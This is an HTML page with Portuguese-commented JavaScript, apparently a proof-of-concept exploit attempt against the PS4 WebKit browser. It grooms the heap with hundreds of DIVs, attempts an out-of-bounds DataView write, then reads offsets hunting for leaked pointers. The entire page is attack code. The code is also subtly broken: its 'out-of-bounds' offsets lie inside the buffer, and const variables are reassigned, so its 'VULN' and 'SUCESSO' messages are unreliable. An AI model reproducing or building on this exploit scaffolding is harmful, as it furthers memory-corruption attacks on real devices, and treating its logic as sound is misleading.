<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Leak Exploit Attempt v10</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para dados OOB não-padrão */
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para ponteiros REAIS vazados */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        #grooming-area { display: none; } /* Esconder divs do grooming */
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Leak Exploit Attempt v10</h1>
    <p>Foco: Heap Grooming com DIVs + Leitura OOB para vazar ponteiros reais.</p>
    <button id="runBtn" onclick="runExploitAttempt()">Iniciar Tentativa de Leak</button>
    <div id="output"></div>
    <div id="grooming-area"></div> <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const groomArea = document.getElementById('grooming-area');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 200;

        // --- Função de Log ---
        const log = (message, type = 'info') => { /* ... Função log ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};

        // --- Heurística de Ponteiro ---
        const isPotentialPointer64 = (high, low) => {
            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
            // Filtra valores triviais ou padrões comuns
            if (high === 0 && low === 0) return false;
            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Ignora padrão AAAA
            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; // Ignora padrão BBBB do nosso buffer
            if (high === 0 && low < 0x100000) return false; // Ignora valores pequenos
            // if (low % 8 !== 0) return false; // Alinhamento opcional
            return true; // Se passou, PODE ser um ponteiro
        };
        const toHex = (val, bits = 32) => { /* ... Função toHex ... */ if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};

        // --- Teste Principal (Heap Grooming + Leitura OOB Focada) ---
        const runLeakExploitAttempt_v10 = async () => {
            log("--- Iniciando Teste Principal: Heap Grooming + Leitura OOB Focada v10 ---", 'test');
            log("ALTO RISCO DE CRASH!", 'warn');

            // Parâmetros baseados no teste "Teste Combinado v6" (index-13.html)
            // onde o leak primitivo foi visto (log ...17cf76.jpg e ...1000137799.jpg).
            const bufferSizeForLeakTest = 32; // Tamanho do buffer usado naquele teste
            const oobWriteOffset = 32; // Offset OOB (relativo ao baseOffset) onde a escrita funcionou
            const writeValue = 0xEE; // Valor escrito naquele teste
            // Offsets OOB (relativos ao baseOffset) onde o padrão AAAA...EE foi visto
            const oobReadOffsets = [-32, -24, -16, -8, 40, 48, 56, 64]; // Correspondem a @-32 a @-8 e @+40 a @+64 relativos ao FIM do buffer original de 32 bytes

            const groomTargetCount = 500; // Número de DIVs para alocar
            const groomDivs = []; // Array para manter referência aos DIVs
            let potentialLeakFound = false;
            let leakedPointers = []; // Array para armazenar ponteiros vazados

            try {
                // 1. HEAP GROOMING com DIVs
                log(`[Grooming] Alocando e adicionando ${groomTargetCount} DIVs ao DOM...`, 'info');
                if (!groomArea) throw new Error("groomArea não encontrada!");
                groomArea.innerHTML = ''; // Limpar área antes
                for(let i = 0; i < groomTargetCount; i++) {
                    try {
                        const div = document.createElement('div');
                        div.id = `groom_div_${i}`;
                        // Tentar variar o conteúdo pode influenciar alocação
                        div.textContent = `Groom ${i} - ` + "X".repeat(128 + (i%64));
                        div.style.padding = `${i%5}px`; // Estilo mínimo
                        groomArea.appendChild(div);
                        groomDivs.push(div); // Guardar referência
                    } catch (e) { log(`Erro alocando/adicionando DIV ${i}: ${e.message}`, 'error'); }
                }
                 log(`[Grooming] ${groomDivs.length} DIVs adicionados. Aguardando...`, 'info');
                 await new Promise(r => setTimeout(r, MEDIUM_PAUSE)); // Pausa maior

                // 2. Alocar Buffer de Ataque (buffer grande o suficiente para escrita e leitura OOB)
                const readBufferSize = 256; // Tamanho do buffer onde faremos R/W
                const baseOffsetInDataView = 128; // Ponto de referência dentro do buffer
                log(`[Alocação] Alocando buffer R/W (tamanho ${readBufferSize})...`, 'info');
                const buffer = new ArrayBuffer(readBufferSize);
                const dataView = new DataView(buffer);
                // Preencher com padrão BB para diferenciar
                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); }
                log(`[Alocação] Buffer R/W preenchido com 0xBB.`, 'info');


                // 3. OOB Write (no offset que funcionou antes, relativo ao baseOffset)
                const writeTargetAddress = baseOffsetInDataView + oobWriteOffset;
                 log(`[OOB Write] Tentando escrita U8 @${oobWriteOffset} (addr ${writeTargetAddress}) com valor ${toHex(writeValue, 8)}...`, 'subtest');
                 try {
                     dataView.setUint8(writeTargetAddress, writeValue);
                     log(`[OOB Write] VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln');
                 } catch (e) {
                     log(`[OOB Write] BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'error');
                     log("--- Teste Interrompido (Escrita OOB falhou) ---", 'test');
                     // Limpar grooming antes de sair
                     try { groomArea.innerHTML = ''; groomDivs.length = 0; } catch(e){}
                     if (runBtn) runBtn.disabled = false;
                     return; // Não continuar
                 }
                 await new Promise(r => setTimeout(r, SHORT_PAUSE));

                 // 4. OOB Read Focada nos Offsets de Interesse (onde AAAA... apareceu)
                 log(`[OOB Read] Lendo U64 nos offsets de interesse (relativos ao baseOffset): [${oobReadOffsets.join(', ')}]`, 'subtest');

                 for (const readOffset of oobReadOffsets) {
                      if (!outputDiv) break; // Parar se o log falhou
                     const readTargetAddress = baseOffsetInDataView + readOffset;
                      // Garantir leitura dentro do buffer alocado
                     if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) {
                          continue;
                     }

                     // log(`  Lendo U64 @${readOffset} (addr ${readTargetAddress})...`, 'info');
                     await new Promise(r => setTimeout(r, 10)); // Pausa pequena entre leituras
                     try {
                         const low = dataView.getUint32(readTargetAddress, true);
                         const high = dataView.getUint32(readTargetAddress + 4, true);
                         const valueStr = `H=${toHex(high)} L=${toHex(low)}`;
                         const maybeAAAA = (high === 0xAAAAAAAA && low === 0xAAAAAAAA);
                         const maybeBBBB = (high === 0xBBBBBBBB && low === 0xBBBBBBBB);

                         // LOGAR APENAS O QUE FOR INTERESSANTE (NÃO 0, NÃO AAAA, NÃO BBBB)
                         if ((low !== 0 || high !== 0) && !maybeAAAA && !maybeBBBB) {
                            if (isPotentialPointer64(high, low)) { // Aplicar heurística
                                 log(`  >> POTENCIAL PONTEIRO ENCONTRADO! @${readOffset} (addr ${readTargetAddress}): ${valueStr}`, 'ptr');
                                 potentialLeakFound = true;
                                 leakedPointers.push({offset: readOffset, addr: readTargetAddress, high: high, low: low});
                             } else {
                                 log(`  >> Dado OOB Não Padrão @${readOffset} (addr ${readTargetAddress}): ${valueStr}`, 'leak');
                                 // Considerar este dado como interessante também?
                                 // potentialLeakFound = true;
                             }
                         } else if (maybeAAAA) {
                              // Logar AAAA apenas uma vez para confirmação se necessário
                              // log(`  Dado OOB @${readOffset}: ${valueStr} (Padrão AAAA...)`, 'info');
                         }

                     } catch (e) {
                         log(`  Leitura OOB U64 @${readOffset} (addr ${readTargetAddress}): FALHA (${e.message})`, 'warn');
                     }
                 } // Fim loop leitura OOB

            } catch (e) { log(`Erro inesperado durante o teste: ${e.message} ${e.stack}`, 'error'); }
            finally {
                // Limpar DIVs do grooming
                log("[Limpeza] Removendo DIVs do grooming...", 'info');
                 try { groomArea.innerHTML = ''; } catch(e){} // Limpar área
                 groomDivs.length = 0; // Limpar array de referência
                 log("[Limpeza] Concluída.", 'info');
            }

            // Log Final
            if (potentialLeakFound) {
                 log(`>>> SUCESSO! Potenciais ponteiros REAIS vazados! <<<`, 'vuln');
                 log("Ponteiros Vazados (offset relativo ao baseOffset, Endereço lido, High, Low):", 'ptr');
                 leakedPointers.forEach(p => log(`  @${p.offset} (addr ${toHex(p.addr, 64)}): ${toHex(p.high)} ${toHex(p.low)}`, 'ptr'));
            } else {
                 log(`--- FALHA: Nenhum ponteiro real promissor encontrado nos offsets de interesse após grooming. ---`, 'warn');
            }
            log("--- Teste Principal Concluído ---", 'test');
        };

        // --- Função Principal ---
        const runExploitAttempt = async () => { // Renomeada no botão/chamada
             if (runBtn) runBtn.disabled = true;
             log("==== INICIANDO TESTE v10 (Leak Exploit Attempt) ====", 'critical');
             const displayUserAgent = () => { const ua=navigator.userAgent||"N/A"; log(`User Agent: ${ua}`,'info'); /* Adicionar parsing */};
             displayUserAgent();
             await runLeakExploitAttempt_v10();
             log("\n==== TESTE v10 CONCLUÍDO ====", 'critical');
             if (runBtn) runBtn.disabled = false;
        };

        // Inicialização para garantir que elementos existem
        const initialize = () => {
            try {
                 outputDiv = document.getElementById('output');
                 runBtn = document.getElementById('runBtn');
                 groomArea = document.getElementById('grooming-area');
                 if (!outputDiv || !runBtn || !groomArea) throw new Error("Elementos essenciais não encontrados");
                 displayUserAgent();
                 log("Script v10 (Leak Exploit Attempt) inicializado. Clique no botão para iniciar.", "info");
            } catch(e) {
                 console.error("Falha ao inicializar:", e);
                 alert("ERRO: Falha ao inicializar o script: " + e.message);
            }
        };

        // Executar inicialização quando o DOM estiver pronto
        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initialize);
        } else {
            initialize(); // Chamar diretamente se já estiver pronto
        }

    </script>

</body>
</html>
